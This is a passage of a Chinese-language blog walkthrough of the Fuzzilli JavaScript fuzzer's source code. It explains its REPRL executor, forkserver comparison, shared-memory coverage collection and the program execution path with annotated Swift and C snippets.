class="hljs-built_in">shm_open</span>(shmKey, O_RDWR, S_IREAD | S_IWRITE);<br>        <span class="hljs-built_in">RELEASE_ASSERT_WITH_MESSAGE</span>(fd &gt;= <span class="hljs-number">0</span>, <span class="hljs-string">&quot;Failed to open shared memory region: %s&quot;</span>, <span class="hljs-built_in">strerror</span>(errno));<br><br>        sharedData = <span class="hljs-built_in">static_cast</span>&lt;SharedData*&gt;(<span class="hljs-built_in">mmap</span>(<span class="hljs-number">0</span>, SHM_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>));<br>        <span class="hljs-built_in">RELEASE_ASSERT_WITH_MESSAGE</span>(sharedData != MAP_FAILED, <span class="hljs-string">&quot;Failed to mmap shared memory region&quot;</span>);<br><br>        <span class="hljs-built_in">dataLogLn</span>(<span class="hljs-string">&quot;[COV] edge counters initialized. Shared memory: %s with %zu edges.&quot;</span>, shmKey, edgesStop - edgesStart);<br>    &#125; <span class="hljs-keyword">else</span><br>        sharedData = <span class="hljs-built_in">static_cast</span>&lt;SharedData*&gt;(<span class="hljs-built_in">malloc</span>(SHM_SIZE));<br><br>    <span class="hljs-built_in">resetCoverageEdges</span>();<br><br>    sharedData-&gt;numEdges = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(edgesStop - edgesStart);<br>&#125;<br></code></pre></td></tr></table></figure><p>同v8的逻辑一致。但是JSC会多一些REPRL相关的接口。</p><h3 id="执行器：由REPRL-swift开始"><a href="#执行器：由REPRL-swift开始" class="headerlink" title="执行器：由REPRL.swift开始"></a>执行器：由REPRL.swift开始</h3><p>在目标引擎执行生成的脚本时，执行速度对于fuzzer的性能至关重要。因此实现了两个机制以减少启动新进程时的开销</p><ol><li>forkserver：与AFL中使用的类似</li><li>REPRL：本质上与libFuzzer中实现的进程内fuzz类似</li></ol><blockquote><p>libFuzzer是在单个进程中执行的fuzzer。libFuzzer不会为每个测试用例启动新进程，而是在同一个进程内存中直接处理数据，这减少了启动进程的开销。</p></blockquote><p>forkserver的核心思想是：节省execve或类似系统调用的大量开销。在目标程序初始化完毕后添加一段代码，等待新的输入样例，每有一个新样例到来都会执行fork()系统调用，由子进程执行输入样例，以避免重复的初始化。</p><p>另一种模式称为”Read-Eval-Print-Repeat-Loop”，检测REPRL，该模式会对多个输入重用现有进程，无需fork一个子进程。本质上他修改了引擎，以便从预定义的fd中读入测试样例然后执行，执行完毕后会重置引擎的内部状态并等待下一个程序，这样就可以避免引擎初始化的大量开销。</p><p>接下来从REPRL类的定义来分析REPRL与Fuzzer的数据交互部分。</p><h4 id="REPRL类"><a href="#REPRL类" class="headerlink" title="REPRL类"></a>REPRL类</h4><p>先去之前<code>makFuzzer</code>函数初始化runnner的地方，前文提及过：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">makeFuzzer</span>(<span class="hljs-params">with</span> <span class="hljs-params">configuration</span>: <span class="hljs-type">Configuration</span>) -&gt; <span class="hljs-type">Fuzzer</span> &#123;<br>    <span class="hljs-comment">// A script runner to execute JavaScript code in an instrumented JS engine.</span><br>    <span class="hljs-comment">// 一个脚本运行器，用于在被插桩的JS引擎中执行JavaScript代码</span><br>    <span class="hljs-keyword">let</span> runner <span class="hljs-operator">=</span> <span class="hljs-type">REPRL</span>(executable: jsShellPath, processArguments: jsShellArguments, processEnvironment: profile.processEnv, maxExecsBeforeRespawn: profile.maxExecsBeforeRespawn)<br>    <span class="hljs-operator">...</span><br>    <span class="hljs-operator">...</span><br>    <span class="hljs-comment">// The evaluator to score produced samples.</span><br>    <span class="hljs-comment">// evaluator为生成的测试用例（样本）进行评分。</span><br>    <span class="hljs-keyword">let</span> evaluator <span class="hljs-operator">=</span> <span class="hljs-type">ProgramCoverageEvaluator</span>(runner: runner)<br>    <span class="hljs-operator">...</span><br>&#125;<br><span class="hljs-comment">// 根据配置生成一个Fuzzer实例</span><br><span class="hljs-keyword">let</span> fuzzer <span class="hljs-operator">=</span> makeFuzzer(with: mainConfig)<br></code></pre></td></tr></table></figure><p>对<code>REPRL</code>函数进行分析，它在<code>Sources/Fuzzilli/Execution/REPRL.swift</code>中，这个文件是REPRL类，REPRL的构造函数很简单，只会记录一下执行参数与环境变量，那么看一下它的构造函数：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">REPRL</span>: <span class="hljs-title class_ inherited__">ComponentBase</span>, <span class="hljs-title class_ inherited__">ScriptRunner</span> &#123;<br>    <span class="hljs-operator">...</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>(<span class="hljs-params">executable</span>: <span class="hljs-type">String</span>, <span class="hljs-params">processArguments</span>: [<span class="hljs-type">String</span>], <span class="hljs-params">processEnvironment</span>: [<span class="hljs-params">String</span>: <span class="hljs-type">String</span>], <span class="hljs-params">maxExecsBeforeRespawn</span>: <span class="hljs-type">Int</span>) &#123;<br>        <span class="hljs-comment">// 把js shell路径与js shell的参数进行拼接</span><br>        <span class="hljs-comment">// e.g. path_to_v8 + v8_shell的参数</span><br>        <span class="hljs-keyword">self</span>.processArguments <span class="hljs-operator">=</span> [executable] <span class="hljs-operator">+</span> processArguments<br>        <span class="hljs-keyword">self</span>.maxExecsBeforeRespawn <span class="hljs-operator">=</span> maxExecsBeforeRespawn<br>        <span class="hljs-keyword">super</span>.<span class="hljs-keyword">init</span>(name: <span class="hljs-string">&quot;REPRL&quot;</span>)<br><span class="hljs-comment">// 记录环境变量</span><br>        <span class="hljs-keyword">for</span> (key, value) <span class="hljs-keyword">in</span> processEnvironment &#123;<br>            env.append(key <span class="hljs-operator">+</span> <span class="hljs-string">&quot;=&quot;</span> <span class="hljs-operator">+</span> value)<br>        &#125;<br>    &#125;<br><span class="hljs-operator">...</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>ProgramCoverageEvaluator</code>的构造函数会设置<code>runner</code>的环境变量，以通过环境变量传入共享内存的id，JS引擎运行时的覆盖率等信息都会被写入到这片共享内存中。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProgramCoverageEvaluator</span>: <span class="hljs-title class_ inherited__">ComponentBase</span>, <span class="hljs-title class_ inherited__">ProgramEvaluator</span> &#123;<br>    <span class="hljs-operator">...</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>(<span class="hljs-params">runner</span>: <span class="hljs-type">ScriptRunner</span>) &#123;<br>        <span class="hljs-comment">// In order to keep clean abstractions, any corpus scheduler requiring edge counting</span><br>        <span class="hljs-comment">// needs to call EnableEdgeTracking(), via downcasting of ProgramEvaluator</span><br>        <span class="hljs-keyword">self</span>.shouldTrackEdgeCounts <span class="hljs-operator">=</span> <span class="hljs-literal">false</span><br><br>        <span class="hljs-keyword">super</span>.<span class="hljs-keyword">init</span>(name: <span class="hljs-string">&quot;Coverage&quot;</span>)<br><span class="hljs-comment">// 设置实例id</span><br>        <span class="hljs-keyword">let</span> id <span class="hljs-operator">=</span> <span class="hljs-type">ProgramCoverageEvaluator</span>.instances<br>        <span class="hljs-type">ProgramCoverageEvaluator</span>.instances <span class="hljs-operator">+=</span> <span class="hljs-number">1</span><br><br>        context.id <span class="hljs-operator">=</span> <span class="hljs-type">Int32</span>(id)<br>        <span class="hljs-keyword">guard</span> libcoverage.cov_initialize(<span class="hljs-operator">&amp;</span>context) <span class="hljs-operator">==</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">fatalError</span>(<span class="hljs-string">&quot;Could not initialize libcoverage&quot;</span>)<br>        &#125;<br><span class="hljs-keyword">#if</span> os(<span class="hljs-type">Windows</span>)<br>        runner.setEnvironmentVariable(<span class="hljs-string">&quot;SHM_ID&quot;</span>, to: <span class="hljs-string">&quot;shm_id_<span class="hljs-subst">\(GetCurrentProcessId())</span>_<span class="hljs-subst">\(id)</span>&quot;</span>)<br><span class="hljs-keyword">#else</span><br>        runner.setEnvironmentVariable(<span class="hljs-string">&quot;SHM_ID&quot;</span>, to: <span class="hljs-string">&quot;shm_id_<span class="hljs-subst">\(getpid())</span>_<span class="hljs-subst">\(id)</span>&quot;</span>)<br><span class="hljs-keyword">#endif</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h4><p>共享内存的机制，第一次接触是在AFL&#x2F;AFL++中，现在探讨一下它的机制：</p><p>共享内存就是允许两个不相关的进程访问同一个逻辑内存。共享内存是在两个正在运行的进程之间共享和传递数据的一种非常有效的方式。不同进程之间共享的内存通常安排为同一段物理内存。进程可以将同一段共享内存连接到它们自己的地址空间中，所有的进程都可以访问共享内存中的地址，就好像它们是由用C语言函数malloc()分配的内存一样。而如果某个进程向共享内存写入数据，所做的改动将立即影响到可以访问同一段共享内存的任何其他进程。使用信号量机制可同步对共享内存的访问。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">shmget</span><span class="hljs-params">(<span class="hljs-type">key_t</span> key, <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> shmflg)</span>;<br></code></pre></td></tr></table></figure><p>第一个参数key（非0整数），它有效地为共享内存段命名，shmget()函数成功时返回一个与key相关的共享内存标识符（非负整数，也就是上述说的SHM_ID）。第二个参数size，以字节为单位指定需要共享的内存容量。第三个参数shmflag是权限标志，与文件的读写权限一样。</p><p>不相关的进程可以通过该函数的返回值(shm_id)访问同一共享内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">shmat</span><span class="hljs-params">(<span class="hljs-type">int</span> shm_id, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *shm_addr, <span class="hljs-type">int</span> shmflg)</span>;<br></code></pre></td></tr></table></figure><p>第一次创建完共享内存时，它还不能被任何进程访问，shmat()函数的作用就是用来启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间。</p><p>第一个参数shm_id，即由<code>shmget()</code>函数返回的共享内存标识符。</p><p>第二个参数shm_addr指定共享内存连接到当前进程中的地址位置，通常为空，让系统来选择共享内存的地址。</p><p>第三个参数shmflg标志位，通常为0</p><p>调用成功时返回一个指向共享内存第一个字节的指针，如果调用失败返回-1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">shmdt</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *shmaddr)</span>;<br></code></pre></td></tr></table></figure><p>该函数用于将共享内存从当前进程中分离。注意，将内存共享分离并不是删除它，只是该共享内存对当前进程不再可用。</p><p>参数shmaddr是shmat()函数返回的地址指针，调用成功时返回0，失败时返回-1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">shmctl</span><span class="hljs-params">(<span class="hljs-type">int</span> shm_id, <span class="hljs-type">int</span> command, <span class="hljs-keyword">struct</span> shmid_ds *buf)</span>;<br></code></pre></td></tr></table></figure><p>第一个参数shm_id，共享内存id。第二个参数command，采取的操作，它的取值如下：</p><ul><li>IPC_STAT：获取共享内存段的信息，存储到buf中。</li><li>IPC_SET：修改共享内存段的权限或属性（通过buf设置）</li><li>IPC_RMID：标记删除共享内存段（实际销毁会在所有进程分离后执行）</li></ul><p>第三个参数buf指向struct shmid_ds结构的指针，用于读取或设置共享内存段的信息。</p><h4 id="REPRL的初始化"><a href="#REPRL的初始化" class="headerlink" title="REPRL的初始化"></a>REPRL的初始化</h4><p>在<code>let fuzzer = makeFuzzer(with: mainConfig)</code>后，获得了一个初始化了fuzzer对象。随后在Fuzzloop中有<code>fuzzer.initialize()</code>，这时就会对fuzzer中的所有配置进行初始化（initialize而不是构造函数init）。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>() &#123;<br>        dispatchPrecondition(condition: .onQueue(queue))<br>        <span class="hljs-built_in">assert</span>(<span class="hljs-operator">!</span>isInitialized)<br><br>        <span class="hljs-comment">// Initialize the script runner first so we are able to execute programs.</span><br>    <span class="hljs-comment">// 首先初始化脚本运行器，以便我们能够执行程序</span><br>        runner.initialize(with: <span class="hljs-keyword">self</span>)<br><br>        <span class="hljs-comment">// Then initialize all components.</span><br>        engine.initialize(with: <span class="hljs-keyword">self</span>)<br>        evaluator.initialize(with: <span class="hljs-keyword">self</span>)<br>        environment.initialize(with: <span class="hljs-keyword">self</span>)<br>        corpus.initialize(with: <span class="hljs-keyword">self</span>)<br>        minimizer.initialize(with: <span class="hljs-keyword">self</span>)<br>        corpusGenerationEngine.initialize(with: <span class="hljs-keyword">self</span>)<br><br>        <span class="hljs-comment">// Finally initialize all modules.</span><br>   <span class="hljs-operator">...</span><br>        <span class="hljs-comment">// Install a watchdog to monitor the utilization of this instance.</span><br>       <span class="hljs-operator">...</span><br>        <span class="hljs-comment">// Determine our initial state if necessary.</span><br>       <span class="hljs-operator">...</span><br><br>        dispatchEvent(events.<span class="hljs-type">Initialized</span>)<br>        logger.info(<span class="hljs-string">&quot;Initialized&quot;</span>)<br>        isInitialized <span class="hljs-operator">=</span> <span class="hljs-literal">true</span><br>    &#125;<br></code></pre></td></tr></table></figure><p><code>REPRL</code>在初始化时会通过<code>libreprl</code>创建并初始化一个REPRL上下文，这部分涉及到C与swift混合编程。由于REPRL与性能息息相关，因此作者通过C实现<code>libreprl</code>。关于runner的<code>initialize</code>方法只是对libreprl中API的调用。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">REPRL</span>: <span class="hljs-title class_ inherited__">ComponentBase</span>, <span class="hljs-title class_ inherited__">ScriptRunner</span> &#123; <br>    <span class="hljs-operator">...</span><br>    <span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>() &#123;<br>        <span class="hljs-comment">// 分配一个新的reprl_context结构</span><br>        reprlContext <span class="hljs-operator">=</span> libreprl.reprl_create_context()<br>        <span class="hljs-keyword">if</span> reprlContext <span class="hljs-operator">==</span> <span class="hljs-literal">nil</span> &#123;<br>            logger.fatal(<span class="hljs-string">&quot;Failed to create REPRL context&quot;</span>)<br>        &#125;<br><br>        <span class="hljs-keyword">let</span> argv <span class="hljs-operator">=</span> convertToCArray(processArguments)<span class="hljs-comment">// 转换为C中的数组</span><br>        <span class="hljs-keyword">let</span> envp <span class="hljs-operator">=</span> convertToCArray(env)<br><span class="hljs-comment">// 初始化REPRL上下文</span><br>        <span class="hljs-keyword">if</span> reprl_initialize_context(reprlContext, argv, envp, <span class="hljs-comment">/* capture stdout */</span> <span class="hljs-number">1</span>, <span class="hljs-comment">/* capture stderr: */</span> <span class="hljs-number">1</span>) <span class="hljs-operator">!=</span> <span class="hljs-number">0</span> &#123;<br>            logger.fatal(<span class="hljs-string">&quot;Failed to initialize REPRL context: <span class="hljs-subst">\(String(cString: reprl_get_last_error(reprlContext)))</span>&quot;</span>)<br>        &#125;<br><span class="hljs-comment">// 初始化完毕，释放这些数组</span><br>        freeCArray(argv, numElems: processArguments.count)<br>        freeCArray(envp, numElems: env.count)<br><span class="hljs-comment">// 对Shutdown事件添加Listener</span><br>        fuzzer.registerEventListener(for: fuzzer.events.<span class="hljs-type">Shutdown</span>) &#123; <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span>                            reprl_destroy_context(<span class="hljs-keyword">self</span>.reprlContext)<br>        &#125;<br>    &#125;<br>    <span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>关于reprl_context结构，以及REPRL具体的实现（libreprl-posix.c），下文会进一步讨论。完成runner的初始化后，会进行:</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// Start the main fuzzing job.</span><br>fuzzer.start(runUntil: exitCondition)<br></code></pre></td></tr></table></figure><p>也就是<code>FuzzOne()</code>，那么<code>FuzzOne()</code>中会有进行Fuzzing的部分，也就是<code>execute()</code>：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">case</span> .fuzzing:<br>iterations <span class="hljs-operator">+=</span> <span class="hljs-number">1</span><br>engine.fuzzOne(fuzzGroup)<br></code></pre></td></tr></table></figure><p>这个<code>engine</code>就是<code>MultiEngine/HybridEngine/MutationEngine/GenerativeEngine</code>中的一个。这个GenerativeEngine是针对空Corpus执行的，当Corpus中存在种子那么基本就不会用它了。这里以通用的<code>MutationEngine</code>为例：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">fuzzOne</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">group</span>: <span class="hljs-type">DispatchGroup</span>) &#123;<br>    <span class="hljs-operator">...</span><br>        <span class="hljs-keyword">let</span> outcome <span class="hljs-operator">=</span> execute(program)<br>    <span class="hljs-operator">...</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其余部分在<code>main.swift</code>中说明过了，这里直接看关键的<code>execute</code>方法：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FuzzEngine</span>: <span class="hljs-title class_ inherited__">ComponentBase</span> &#123;<br><span class="hljs-keyword">final</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">execute</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">program</span>: <span class="hljs-type">Program</span>, <span class="hljs-params">withTimeout</span> <span class="hljs-params">timeout</span>: <span class="hljs-type">UInt32</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>) -&gt; <span class="hljs-type">ExecutionOutcome</span> &#123;<br>        <span class="hljs-comment">// 如果有Processor，那么先调用它进行处理</span><br>        <span class="hljs-keyword">let</span> program <span class="hljs-operator">=</span> postProcessor<span class="hljs-operator">?</span>.process(program, for: fuzzer) <span class="hljs-operator">??</span> program<br><span class="hljs-comment">// 触发ProgramGenerated事件</span><br>        fuzzer.dispatchEvent(fuzzer.events.<span class="hljs-type">ProgramGenerated</span>, data: program)<br><span class="hljs-comment">// 执行program程序</span><br>        <span class="hljs-keyword">let</span> execution <span class="hljs-operator">=</span> fuzzer.execute(program, withTimeout: timeout, purpose: .fuzzing)<br><br>        <span class="hljs-keyword">switch</span> execution.outcome &#123;<span class="hljs-comment">// 处理执行结果</span><br>            <span class="hljs-keyword">case</span> .crashed(<span class="hljs-keyword">let</span> termsig):<span class="hljs-comment">// 触发Crash</span><br>                fuzzer.processCrash(program, withSignal: termsig, withStderr: execution.stderr, withStdout: execution.stdout, origin: .local, withExectime: execution.execTime)<br>                program.contributors.generatedCrashingSample()<br><br>            <span class="hljs-keyword">case</span> .succeeded:<span class="hljs-comment">// 执行成功</span><br>                fuzzer.dispatchEvent(fuzzer.events.<span class="hljs-type">ValidProgramFound</span>, data: program)<br>                <span class="hljs-keyword">var</span> isInteresting <span class="hljs-operator">=</span> <span class="hljs-literal">false</span><span class="hljs-comment">// 是否触发新边</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> aspects <span class="hljs-operator">=</span> fuzzer.evaluator.evaluate(execution) &#123;<span class="hljs-comment">// 对该程序进行评估</span><br>                    <span class="hljs-keyword">if</span> fuzzer.config.enableInspection &#123;<br>                        program.comments.add(<span class="hljs-string">&quot;Program may be interesting due to <span class="hljs-subst">\(aspects)</span>&quot;</span>, at: .footer)<br>                        program.comments.add(<span class="hljs-string">&quot;RUNNER ARGS: <span class="hljs-subst">\(fuzzer.runner.processArguments.joined(separator: <span class="hljs-string">&quot; &quot;</span>))</span>&quot;</span>, at: .header)<br>                    &#125;<br>                    isInteresting <span class="hljs-operator">=</span> fuzzer.processMaybeInteresting(program, havingAspects: aspects, origin: .local)<span class="hljs-comment">// 判断是否发现新边</span><br>                &#125;<br><span class="hljs-comment">// 触发该程序上的回调</span><br>                <span class="hljs-keyword">if</span> isInteresting &#123;<br>                    program.contributors.generatedInterestingSample()<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    program.contributors.generatedValidSample()<br>                &#125;<br><br>            <span class="hljs-keyword">case</span> .failed(<span class="hljs-keyword">_</span>):<span class="hljs-comment">// 执行失败，js shell抛出异常</span><br>                <span class="hljs-keyword">if</span> fuzzer.config.enableDiagnostics &#123;<br>                    program.comments.add(<span class="hljs-string">&quot;Stdout:<span class="hljs-subst">\n</span>&quot;</span> <span class="hljs-operator">+</span> execution.stdout, at: .footer)<br>                &#125;<br>                fuzzer.dispatchEvent(fuzzer.events.<span class="hljs-type">InvalidProgramFound</span>, data: program)<br>                program.contributors.generatedInvalidSample()<br><br>            <span class="hljs-keyword">case</span> .timedOut:<span class="hljs-comment">// 执行超时</span><br>                fuzzer.dispatchEvent(fuzzer.events.<span class="hljs-type">TimeOutFound</span>, data: program)<br>                program.contributors.generatedTimeOutSample()<br>        &#125;<br>        <span class="hljs-keyword">return</span> execution.outcome<span class="hljs-comment">// 返回执行结果</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Execute()</code>方法会执行该测试样例，然后根据执行结果做对应的处理。可以看到，其实还封装了一层，这里依然会调用<code>Fuzzer::execute()</code>方法来执行这个<code>program</code>。这里的<code>program</code>是<code>FuzzIL</code>指令组成的程序，因此需要通过lifter将其翻译成字符串格式的<code>js</code>脚本，然后调用<code>runner.run()</code>执行该脚本。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fuzzer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">execute</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">program</span>: <span class="hljs-type">Program</span>, <span class="hljs-params">withTimeout</span> <span class="hljs-params">timeout</span>: <span class="hljs-type">UInt32</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>, <span class="hljs-params">purpose</span>: <span class="hljs-type">ExecutionPurpose</span>) -&gt; <span class="hljs-type">Execution</span> &#123;<br>        <span class="hljs-operator">...</span><br>        <span class="hljs-keyword">let</span> script <span class="hljs-operator">=</span> lifter.lift(program)   <span class="hljs-comment">// 把FuzzIL提升为js程序</span><br><br>        dispatchEvent(events.<span class="hljs-type">PreExecute</span>, data: (program, purpose))  <span class="hljs-comment">// 触发preExecute事件</span><br>        <span class="hljs-keyword">let</span> execution <span class="hljs-operator">=</span> runner.run(script, withTimeout: timeout <span class="hljs-operator">??</span> config.timeout)  <span class="hljs-comment">// 调用执行器执行脚本</span><br>        dispatchEvent(events.<span class="hljs-type">PostExecute</span>, data: execution)  <span class="hljs-comment">// 触发PostExecute事件</span><br><br>        <span class="hljs-keyword">return</span> execution<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>进一步看<code>runner.run()</code>方法：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">REPRL</span>: <span class="hljs-title class_ inherited__">ComponentBase</span>, <span class="hljs-title class_ inherited__">ScrswiftiptRunner</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">run</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">script</span>: <span class="hljs-type">String</span>, <span class="hljs-params">withTimeout</span> <span class="hljs-params">timeout</span>: <span class="hljs-type">UInt32</span>) -&gt; <span class="hljs-type">Execution</span> &#123;<br>        <span class="hljs-operator">...</span><br>        <span class="hljs-comment">// 初始化一个执行结果对象，用于记录执行结果并返回</span><br>        <span class="hljs-keyword">let</span> execution <span class="hljs-operator">=</span> <span class="hljs-type">REPRLExecution</span>(from: <span class="hljs-keyword">self</span>)<br>        <span class="hljs-operator">...</span><br>        <br>        <span class="hljs-keyword">var</span> status: <span class="hljs-type">Int32</span> <span class="hljs-operator">=</span> <span 